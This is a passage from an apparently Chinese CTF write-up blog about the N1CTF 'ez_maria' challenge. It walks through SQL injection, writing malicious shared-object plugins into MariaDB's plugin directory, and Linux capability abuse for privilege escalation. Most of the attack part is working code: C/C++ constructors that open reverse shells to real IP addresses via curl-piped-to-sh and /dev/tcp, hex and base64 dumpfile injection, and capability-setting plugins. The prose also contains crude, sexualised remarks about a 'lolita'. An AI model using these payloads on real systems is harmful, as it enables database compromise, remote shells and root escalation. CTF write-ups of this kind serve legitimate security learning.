factory.createConnection();</span><br><span class="line">        <span class="type">Session</span> <span class="variable">subSession</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        <span class="type">Queue</span> <span class="variable">queue</span> <span class="operator">=</span> subSession.createQueue(<span class="string">&quot;flagqueue&quot;</span>);</span><br><span class="line">        <span class="type">MessageConsumer</span> <span class="variable">subscriber</span> <span class="operator">=</span> subSession.createConsumer(queue);</span><br><span class="line">        subscriber.setMessageListener(<span class="built_in">this</span>);</span><br><span class="line">        connection.start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>MessageConsumer subscriber = subSession.createConsumer(queue);</code> ：使用  <code>Session</code>  创建一个  <code>MessageConsumer</code>  对象，该对象用于接收队列  <code>flagqueue</code>  上的消息。</p><p>一个德拉米，你设计牛魔的√Ⅷ 题呢，纯😅恶心人，复现都不让了👴安宁。还好👴是完美天才的 idol (暴论😡)</p><p>注意米线<img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/cc4c3cec08fa513d70d1c712786d55fbb0fbd9c3.jpg" alt="cc4c3cec08fa513d70d1c712786d55fbb0fbd9c3"></p><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/ee8b339371cb6287bdb73d2f1d82c482d5a25b5c.jpg" alt="ee8b339371cb6287bdb73d2f1d82c482d5a25b5c"></p><h1 id="ez_maria"><span id="ez_maria"> ez_maria</span></h1><p>好可爱的 lolita🥵🥵, 不知道 n1 都怎么忍住的，是我直接… 狠狠地把这题做出来，虽然也不一定能做出来就是了.😤</p><p>上来就告诉你有 SQL 的利用点，不多说，直接狠狠地搞点事.</p><p>二话不说，打个绞线 (读个 index.php)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span> union select <span class="number">1</span>, load_file(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="源码分析"><span id="源码分析"> 源码分析</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//for n1ctf ezmariadb secret cmd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_REQUEST</span>[<span class="string">&quot;secret&quot;</span>] === <span class="string">&quot;lolita_love_you_forever&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/plain&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`ps -ef` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ps -ef&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`ls -l /` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l /&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`ls -l /var/www/html/` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l /var/www/html/&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\\n\\n`find /mysql` result\\n\\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;find /mysql&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;can you get shell?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="variable">$dbn</span> = <span class="string">&quot;ctf&quot;</span>;</span><br></pre></td></tr></table></figure><p>waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(master|change|outfile|slave|start|status|insert|delete|drop|execute|function|return|alter|global|immediate)/is&quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&quot;id&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你就不能绕一下喵&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到当 <code>secret=lolita_love_you_forever</code>  时，会爆出一些信息.</p><p>lolita 真的会爱我吗，我已经单身二十年甚至十九年，lolita 爱我的话，小🚹👩‍🦰也不是不行…(不行，👴永远喜欢栗山未来)</p><p>传参，获取一些有用的信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mariadbd --skip-grant-tables --secure-file-priv= --datadir=/mysql/data --plugin_dir=/mysql/plugin --user=mysql</span><br></pre></td></tr></table></figure><p>plugin 目录是 <code>/mysql/plugin</code> , <code>secure-file-priv</code>  是空的，这表示 MySQL 允许从任何位置读取数据文件。</p><p>ならば、答えはひとつだ.(bushi)</p><p>往 /mysql/plugin 目录写 so 打 udf😊, 虽然 function 被 ban, 但是我们还有 INSTALL</p><h2 id="udf-写-so"><span id="udf-写-so"> UDF 写 so🤪</span></h2><p>写法一:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__attribute__</span>((constructor)) <span class="keyword">void</span> <span class="title function_ invoke__">init</span>(<span class="keyword">int</span> argc, char *argv[]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl https://reverse-shell.sh/82.156.5.200:1034 | sh &amp;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写法二：来自 Lolita 的❤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">lshell</span>()&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/43.143.192.19/1145 0&gt;&amp;1 &amp;&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LOLITA</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="title function_ invoke__">LOLITA</span>()&#123;</span><br><span class="line">        <span class="title function_ invoke__">lshell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">LOLITA lolita;</span><br><span class="line">LOLITA* _mysql_plugin_interface_version_ = &amp;lolita;</span><br><span class="line"><span class="comment">//compile: g++ expso.cpp -shared -fPIC -o exp.so</span></span><br></pre></td></tr></table></figure><p>以及来自 DJB 的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -fPIC -shared -o preload.so preload.c -nostartfiles -nolibc</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">_init</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/43.143.192.19/1145 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o preload.so preload.c -nostartfiles -nolibc</span><br></pre></td></tr></table></figure><p>-nostartfiles -nolibc 这两个选项比较高级，嵌入式系统常使用</p><p>写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="title function_ invoke__">open</span>(<span class="string">&quot;preaload.so&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">xid = <span class="string">&quot;1; select unhex(&#x27;&quot;</span> + <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>([<span class="string">&#x27;%02X&#x27;</span> % b <span class="keyword">for</span> b in <span class="title function_ invoke__">bytes</span>(f.<span class="title function_ invoke__">read</span>())]) + <span class="string">&quot;&#x27;) into dumpfile &#x27;/mysql/plugin/lolita.so&#x27;;&quot;</span></span><br><span class="line">res = requests.<span class="title function_ invoke__">post</span>(url, data=&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: xid</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>或者 NESE 大爹的写法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>; select <span class="title function_ invoke__">from_base64</span>(<span class="string">&#x27;xx&#x27;</span>) into dumpfile <span class="string">&#x27;/mysql/plugin/xxx.so&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li><code>%</code> ：表示格式说明符的起始。</li><li><code>0</code> ：表示使用零来填充字段宽度，如果转换的值不足指定的宽度。</li><li><code>2</code> ：表示字段的最小宽度，即输出的字符串中至少会有两个字符。</li><li><code>X</code> ：表示要将整数以十六进制形式输出，并且使用大写字母。</li></ul><p>写进去还没完，由于没有 mysql 库，得先创造个 mysql 库，👴真是太菜了，👴要学！！！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS mysql;</span><br><span class="line"><span class="keyword">use</span> <span class="title">mysql</span>;</span><br><span class="line">CREATE TABLE IF NOT EXISTS <span class="title function_ invoke__">plugin</span> ( name <span class="title function_ invoke__">varchar</span>(<span class="number">64</span>) DEFAULT <span class="string">&#x27;&#x27;</span> NOT <span class="literal">NULL</span>, dl <span class="title function_ invoke__">varchar</span>(<span class="number">128</span>) DEFAULT <span class="string">&#x27;&#x27;</span> NOT <span class="literal">NULL</span>, PRIMARY <span class="title function_ invoke__">KEY</span> (name) ) engine=Aria transactional=<span class="number">1</span> CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci comment=<span class="string">&#x27;MySQL plugins&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;create database mysql;create table mysql.<span class="title function_ invoke__">plugin</span>(name <span class="title function_ invoke__">varchar</span>(<span class="number">64</span>), dl <span class="title function_ invoke__">varchar</span>(<span class="number">128</span>));INSTALL PLUGIN testx SONAME <span class="string">&#x27;lolita.so&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p><code>CREATE TABLE IF NOT EXISTS plugin</code> : 这部分开始了一个创建表的 SQL 语句。 <code>IF NOT EXISTS</code>  部分表示如果同名的表已经存在，就不再创建，以避免重复创建。</p></li><li><p><code>( name varchar(64) DEFAULT '' NOT NULL, dl varchar(128) DEFAULT '' NOT NULL)</code> : 这一部分定义了表的列。具体解释如下：</p><ul><li><code>name varchar(64)</code> : 创建一个名为 “name” 的列，其数据类型为 VARCHAR，最大长度为 64 个字符。这个列存储插件的名称。</li><li><code>dl varchar(128)</code> : 创建一个名为 “dl” 的列，其数据类型为 VARCHAR，最大长度为 128 个字符。这个列存储插件的下载链接。</li><li><code>DEFAULT ''</code> : 这部分指定了如果没有提供值，这两个列的默认值是空字符串。</li><li><code>NOT NULL</code> : 这部分指定了这两列是非空的，也就是说，插入数据时必须为它们提供值。</li></ul></li><li><p><code>PRIMARY KEY (name)</code> : 这一部分定义了一个主键约束。它指定 “name” 列作为主键，这意味着 “name” 列中的值必须是唯一的，用于唯一标识每个插件。</p></li><li><p><code>engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci</code> : 这部分定义了表的引擎、事务性、字符集和排序规则。</p><ul><li><code>engine=Aria</code> : 表使用 Aria 存储引擎。</li><li><code>transactional=1</code> : 表被指定为事务性表。</li><li><code>CHARACTER SET utf8mb3</code> : 表的字符集被设置为 UTF-8 MB3。</li><li><code>COLLATE utf8mb3_general_ci</code> : 表的排序规则被设置为 UTF-8 MB3 的通用不区分大小写排序规则。</li></ul></li><li><p><code>comment='MySQL plugins'</code> : 这一部分可以用于提供表的注释或描述。在这种情况下，表的注释是 “MySQL plugins”，以便更好地理解表的用途。</p><p>👴给你详细地介绍一下怎么个事，算是介绍一个建表模板了，避免以后建表出 bug.</p></li></ol><p>接下来加载恶意 so 文件，弹 shell 成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;INSTALL PLUGIN lolita SONAME <span class="string">&#x27;lolita.so&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699444663266.png" alt="1699444663266"></p><p>然而这可并不是终点，阿米诺斯，flag 没权限读</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -exec getcap &#123;&#125; ; <span class="number">2</span>&gt;/dev/<span class="literal">null</span> </span><br></pre></td></tr></table></figure><p>对每个文件运行  <code>getcap</code>  命令，以查看文件是否拥有 &quot;capabilities&quot; 属性。而  <code>-exec</code>  部分是用于执行这个检查的命令， <code>&#123;&#125;</code>  是占位符</p><p><code>getcap</code>  是 Linux 命令行工具，用于检查和显示文件的 &quot;capabilities&quot;。它允许你查看与特定文件或可执行文件相关联的 &quot;capabilities&quot;</p><h2 id="牛魔的什么事-capabilities-权限"><span id="牛魔的什么事-capabilities-权限"> 牛魔的什么事 capabilities 权限😓</span></h2><p><a href="https://blog.csdn.net/xdy762024688/article/details/132237969">linux setcap 命令详解 (包括各个 cap 的使用举例)_xiedy001 的博客 - CSDN 博客</a></p><p><a href="https://www.freebuf.com/articles/system/358115.html">Linux 提权之 Capabilities 提权（一） - FreeBuf 网络安全行业门户</a></p><p>来自 lolita 小改改 (bushi) 的❤</p><p>&quot;capabilities&quot; 权限是 Linux 内核引入的，用于精细划分超级用户权限的领域</p><p>说白了，root 被分权了，capabilities 继承一部分.</p><ol><li><code>CAP_NET_BIND_SERVICE</code> ：允许绑定小于 1024 的网络端口。</li><li><code>CAP_SYS_ADMIN</code> ：允许执行一些系统管理任务，如挂载文件系统。</li><li><code>CAP_DAC_OVERRIDE</code> ：允许忽略文件的传统 Unix 权限。</li><li><code>CAP_SYS_PTRACE</code> ：允许跟踪其他进程。</li><li><code>CAP_SETUID</code> ：允许进程改变其有效用户 ID。</li></ol><table><thead><tr><th style="text-align:center">capability 名称</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">CAPAUDITCONTROL</td><td style="text-align:center">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td></tr><tr><td style="text-align:center">CAPAUDITREAD</td><td style="text-align:center">允许通过 multicast netlink 套接字读取审计日志</td></tr><tr><td style="text-align:center">CAPAUDITWRITE</td><td style="text-align:center">将记录写入内核审计日志</td></tr><tr><td style="text-align:center">CAPBLOCKSUSPEND</td><td style="text-align:center">使用可以阻止系统挂起的特性</td></tr><tr><td style="text-align:center">CAP_CHOWN</td><td style="text-align:center">修改文件所有者的权限</td></tr><tr><td style="text-align:center">CAPDACOVERRIDE</td><td style="text-align:center">忽略文件的 DAC 访问限制</td></tr><tr><td style="text-align:center">CAP_DAC_READ_SEARCH</td><td style="text-align:center">忽略文件读及目录搜索的 DAC 访问限制</td></tr><tr><td style="text-align:center">CAP_FOWNER</td><td style="text-align:center">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td></tr><tr><td style="text-align:center">CAP_FSETID</td><td style="text-align:center">允许设置文件的 setuid 位</td></tr><tr><td style="text-align:center">CAPIPCLOCK</td><td style="text-align:center">允许锁定共享内存片段</td></tr><tr><td style="text-align:center">CAPIPCOWNER</td><td style="text-align:center">忽略 IPC 所有权检查</td></tr><tr><td style="text-align:center">CAP_KILL</td><td style="text-align:center">允许对不属于自己的进程发送信号</td></tr><tr><td style="text-align:center">CAP_LEASE</td><td style="text-align:center">允许修改文件锁的 FL_LEASE 标志</td></tr><tr><td style="text-align:center">CAPLINUXIMMUTABLE</td><td style="text-align:center">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td></tr><tr><td style="text-align:center">CAPMACADMIN</td><td style="text-align:center">允许 MAC 配置或状态更改</td></tr><tr><td style="text-align:center">CAPMACOVERRIDE</td><td style="text-align:center">忽略文件的 DAC 访问限制</td></tr><tr><td style="text-align:center">CAP_MKNOD</td><td style="text-align:center">允许使用 mknod () 系统调用</td></tr><tr><td style="text-align:center">CAPNETADMIN</td><td style="text-align:center">允许执行网络管理任务</td></tr><tr><td style="text-align:center">CAPNETBIND_SERVICE</td><td style="text-align:center">允许绑定到小于 1024 的端口</td></tr><tr><td style="text-align:center">CAPNETBROADCAST</td><td style="text-align:center">允许网络广播和多播访问</td></tr><tr><td style="text-align:center">CAPNETRAW</td><td style="text-align:center">允许使用原始套接字</td></tr><tr><td style="text-align:center">CAP_SETGID</td><td style="text-align:center">允许改变进程的 GID</td></tr><tr><td style="text-align:center">CAP_SETFCAP</td><td style="text-align:center">允许为文件设置任意的 capabilities</td></tr><tr><td style="text-align:center">CAP_SETPCAP</td><td style="text-align:center">参考 capabilities man page</td></tr><tr><td style="text-align:center">CAP_SETUID</td><td style="text-align:center">允许改变进程的 UID</td></tr><tr><td style="text-align:center">CAPSYSADMIN</td><td style="text-align:center">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td></tr><tr><td style="text-align:center">CAPSYSBOOT</td><td style="text-align:center">允许重新启动系统</td></tr><tr><td style="text-align:center">CAPSYSCHROOT</td><td style="text-align:center">允许使用 chroot () 系统调用</td></tr><tr><td style="text-align:center">CAPSYSMODULE</td><td style="text-align:center">允许插入和删除内核模块</td></tr><tr><td style="text-align:center">CAPSYSNICE</td><td style="text-align:center">允许提升优先级及设置其他进程的优先级</td></tr><tr><td style="text-align:center">CAPSYSPACCT</td><td style="text-align:center">允许执行进程的 BSD 式审计</td></tr><tr><td style="text-align:center">CAPSYSPTRACE</td><td style="text-align:center">允许跟踪任何进程</td></tr><tr><td style="text-align:center">CAPSYSRAWIO</td><td style="text-align:center">允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td></tr><tr><td style="text-align:center">CAPSYSRESOURCE</td><td style="text-align:center">忽略资源限制</td></tr><tr><td style="text-align:center">CAPSYSTIME</td><td style="text-align:center">允许改变系统时钟</td></tr><tr><td style="text-align:center">CAPSYSTTY_CONFIG</td><td style="text-align:center">允许配置 TTY 设备</td></tr><tr><td style="text-align:center">CAP_SYSLOG</td><td style="text-align:center">允许使用 syslog () 系统调用</td></tr><tr><td style="text-align:center">CAPWAKEALARM</td><td style="text-align:center">允许触发一些能唤醒系统的东西 (比如 CLOCKBOOTTIMEALARM 计时器)</td></tr></tbody></table><p>设置与删除 Capabilities</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcap cap_sys_admin+ep /usr/sbin/python <span class="comment">#设置capabilities权限</span></span><br><span class="line">setcap -r /usr/sbin/python <span class="comment">#移除capabilities权限</span></span><br></pre></td></tr></table></figure><p>查找 Capabilities 的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br><span class="line">find / -exec getcap &#123;&#125; ; <span class="number">2</span>&gt;/dev/<span class="literal">null</span> </span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699446001202.png" alt="1699446001202"></p><p>这里 maraidb 有 cap_setfcap 的权限，允许为文件设置任意的 capabilities.</p><h2 id="其一"><span id="其一"> 其一</span></h2><p>写个 readflag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc readflag.c -o readflag</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">main</span>() &#123;</span><br><span class="line">    char *buffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="title function_ invoke__">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    FILE* f = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fread</span>(buffer, <span class="number">1024</span>, <span class="number">1</span>, f);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(f);</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>万能的 base64 写一切</p><p>再写一个调用  <code>cap_set_file</code>  给 readflag 挂上 cap_setuid=ep<br> 之后用 mariadb 加载恶意 so, mariadb –plugin-dir=/mysql/plugin/ –default-auth=setcap</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/capability.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// setcap cap_setuid+ep readflag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/bin/mariadb cap_setfcap=ep</span></span><br><span class="line"><span class="comment">// gcc -fPIC -shared setcap.c -o setcap.so -lcap</span></span><br><span class="line"><span class="title function_ invoke__">__attribute__</span> ((__constructor__)) <span class="keyword">void</span> <span class="title function_ invoke__">test</span> (<span class="keyword">void</span>)&#123;</span><br><span class="line">    cap_t cap = <span class="title function_ invoke__">cap_from_text</span>(<span class="string">&quot;cap_setuid+ep&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">cap_set_file</span>(<span class="string">&quot;/mysql/plugin/readflag&quot;</span>, cap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p><code>cap_t cap = cap_from_text(&quot;cap_setuid+ep&quot;);</code> ：这行代码使用 <code>cap_from_text</code>  函数创建一个能力集（capability set）。在 Linux 中，能力集是一种安全机制，用于管理进程对系统资源和操作的访问权限。 <code>cap_setuid+ep</code>  表示启用 &quot;设置用户标识&quot;（ <code>cap_setuid</code> ）和 &quot;提升特权&quot;（ <code>ep</code> ，意味着效果持久），这意味着程序将具有提升权限的能力.</p><p>人言：获取 <code>cap_setuid</code>  这种 cap, 然后给 readflag 赋上</p></li><li><p><code>cap_set_file(&quot;/mysql/plugin/readflag&quot;, cap);</code> ：给 readflag 上权限</p><p>编译</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared setcap.c -o setcap.so -lcap</span><br></pre></td></tr></table></figure><p><code>-lcap</code>  是编译 C/C++ 程序时传递给编译器的选项之一，用于指定链接到 Linux 能力库，一些常见的能力库函数包括  <code>cap_from_text</code>  和  <code>cap_set_file</code>  在这里面</p><p>rnm, 编译不出来，本地编译吧。报错:fatal error: sys/capability.h</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libcap-dev</span><br></pre></td></tr></table></figure><p>解决一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mariadb –-plugin-dir=/tmp –-<span class="keyword">default</span>-auth=cap &amp;</span><br></pre></td></tr></table></figure><h2 id="其二"><span id="其二"> 其二</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/capability.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">lshell</span>()&#123;</span><br><span class="line">    cap_t caps = <span class="title function_ invoke__">cap_from_text</span>(<span class="string">&quot;cap_dac_override=eip&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">cap_set_file</span>(<span class="string">&quot;/bin/cat&quot;</span>, caps);</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;setcap finished\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LOLITA</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="title function_ invoke__">LOLITA</span>()&#123;</span><br><span class="line">        <span class="title function_ invoke__">lshell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">LOLITA _mysql_client_plugin_declaration_;</span><br><span class="line"><span class="comment">//compile: g++ evil.c -shared -fPIC -o cap.so -lcap2</span></span><br><span 